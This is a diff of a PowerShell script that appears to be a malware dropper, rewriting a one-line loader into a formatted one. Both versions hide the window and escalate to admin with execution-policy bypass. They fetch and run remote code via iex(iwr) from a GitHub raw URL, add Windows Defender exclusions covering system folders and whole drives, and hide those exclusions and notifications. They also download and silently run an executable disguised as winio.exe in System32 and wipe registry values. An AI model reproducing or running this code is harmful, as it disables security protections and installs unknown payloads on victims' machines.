@@ -1,1 +1,86 @@
-if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")){$newProc=Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0' -UseBasicP)") -Verb RunAs -PassThru;$newProc.WaitForExit();exit;}else{$paths=@("C:\Program Files\Windows Defender","C:\Program Files\Windows Defender Advanced Threat Protection","C:\Program Files\Windows NT","C:\Program Files\Windows Security","C:\Program Files\WindowsPowerShell","C:\Program Files (x86)\Internet Explorer","C:\Program Files (x86)\Microsoft","C:\Program Files (x86\Windows Defender","C:\Program Files (x86)\Windows NT","C:\Program Files (x86)\WindowsPowerShell","C:\Windows\Boot","C:\Windows\CSC","C:\Windows\debug","C:\Windows\diagnostics","C:\Windows\Logs","C:\Windows\PLA","C:\Windows\Resources","C:\Windows\security","C:\Windows\System","C:\Windows\System32","C:\Windows\SystemApps","C:\Windows\SystemResources","C:\Windows\SystemTemp","C:\Windows\SysWOW64","C:\Windows\Tasks","C:\Windows\WinSxS","C:\","D:\");foreach($path in $paths){Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue};Start-BitsTransfer -Source 'https://raw.githubusercontent.com/aodfs/0/main/1' -Destination 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;if (-not (Test-Path 'C:\Windows\System32\winio.exe')){Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aodfs/0/main/1' -OutFile 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;}try{Start-Process -FilePath 'C:\Windows\System32\winio.exe' -Verb RunAs -WindowStyle Hidden -ErrorAction SilentlyContinue;}catch{& 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;};$regEntries=Get-ItemProperty -Path $regPath;foreach($entry in $regEntries.PSObject.Properties){if($entry.Name -ne "PSPath" -and $entry.Name -ne "PSParentPath" -and $entry.Name -ne "PSChildName" -and $entry.Name -ne "PSDrive" -and $entry.Name -ne "PSProvider"){Remove-ItemProperty -Path $regPath -Name $entry.Name}}}
+Add-Type -TypeDefinition @"
+using System; 
+using System.Runtime.InteropServices; 
+public class WindowHelper 
+{ 
+    [DllImport("user32.dll")] 
+    public static extern IntPtr GetForegroundWindow(); 
+
+    [DllImport("user32.dll")] 
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); 
+
+    public const int SW_HIDE = 0; 
+    public static void HideWindow() 
+    { 
+        IntPtr handle = GetForegroundWindow(); ShowWindow(handle, SW_HIDE); 
+    }
+}
+"@; 
+[WindowHelper]::HideWindow();
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "HideExclusionsFromLocalAdmins" -Value 1 -Type DWord
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "HideExclusions" -Value 1 -Type DWord
+Set-ItemProperty -Path $registryPath -Name "DisableAllNotifications" -Value 1 -Type DWord
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
+{
+    $newProc=Start-Process -FilePath "powershell.exe" -ArgumentList ("-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command iex(iwr 'https://raw.githubusercontent.com/aodfs/0/main/0-wp' -UseBasicP)") -Verb RunAs -PassThru;$newProc.WaitForExit();
+    exit;
+}
+else
+{
+    $paths = @(
+        "C:\Program Files\Windows Defender",
+        "C:\Program Files\Windows Defender Advanced Threat Protection",
+        "C:\Program Files\Windows NT",
+        "C:\Program Files\Windows Security",
+        "C:\Program Files\WindowsPowerShell",
+        "C:\Program Files (x86)\Internet Explorer",
+        "C:\Program Files (x86)\Microsoft",
+        "C:\Program Files (x86\Windows Defender",
+        "C:\Program Files (x86)\Windows NT",
+        "C:\Program Files (x86)\WindowsPowerShell",
+        "C:\Windows\Boot",
+        "C:\Windows\CSC",
+        "C:\Windows\debug",
+        "C:\Windows\diagnostics",
+        "C:\Windows\Logs",
+        "C:\Windows\PLA",
+        "C:\Windows\Resources",
+        "C:\Windows\security",
+        "C:\Windows\System",
+        "C:\Windows\System32",
+        "C:\Windows\SystemApps",
+        "C:\Windows\SystemResources",
+        "C:\Windows\SystemTemp",
+        "C:\Windows\SysWOW64",
+        "C:\Windows\Tasks",
+        "C:\Windows\WinSxS",
+        "C:\",
+        "D:\"
+    );
+    foreach($path in $paths)
+    {
+        Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue
+    };
+    Start-BitsTransfer -Source 'https://raw.githubusercontent.com/aodfs/0/main/1' -Destination 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
+    if (-not (Test-Path 'C:\Windows\System32\winio.exe'))
+    {
+        Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aodfs/0/main/1' -OutFile 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
+    }
+    try
+    {
+        Start-Process -FilePath 'C:\Windows\System32\winio.exe' -Verb RunAs -WindowStyle Hidden -ErrorAction SilentlyContinue;
+    }
+    catch
+    {
+        & 'C:\Windows\System32\winio.exe' -ErrorAction SilentlyContinue;
+    };
+    $regEntries = Get-ItemProperty -Path $regPath;
+    
+    foreach($entry in $regEntries.PSObject.Properties)
+    {
+        if($entry.Name -ne "PSPath" -and $entry.Name -ne "PSParentPath" -and $entry.Name -ne "PSChildName" -and $entry.Name -ne "PSDrive" -and $entry.Name -ne "PSProvider")
+        {
+            Remove-ItemProperty -Path $regPath -Name $entry.Name
+        }
+    }
+}
